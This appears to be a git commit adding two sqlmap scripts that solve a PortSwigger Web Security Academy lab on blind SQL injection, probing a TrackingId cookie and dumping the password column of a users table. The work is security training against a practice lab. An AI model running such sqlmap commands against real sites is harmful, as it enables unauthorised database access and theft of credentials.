0eaf312aec84cea001660beda37cf791ad617afd
CosmicSage <prabhakarmishra9@yahoo.com>
2023-06-07 18:27:58 +0530

    whaterver tool result...  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

---
+++ injection/sql/blind/error/bomb.sh
@@ -0,0 +1,1 @@
+python sqlmap.py --cookie="TrackingId=TOG1zSaZMorVvdNs" -u "https://0acc004a0326da0b802a3f0300ef0095.web-security-academy.net/" -p "TrackingId" --level 2
---
+++ injection/sql/blind/error/dump.sh
@@ -0,0 +1,2 @@
+python sqlmap.py --cookie="TrackingId=TOG1zSaZMorVvdNs" -u "https://0acc004a0326da0b802a3f0300ef0095.web-security-academy.net/" \
+-p "TrackingId"  --level 2   -T users -C password --dump
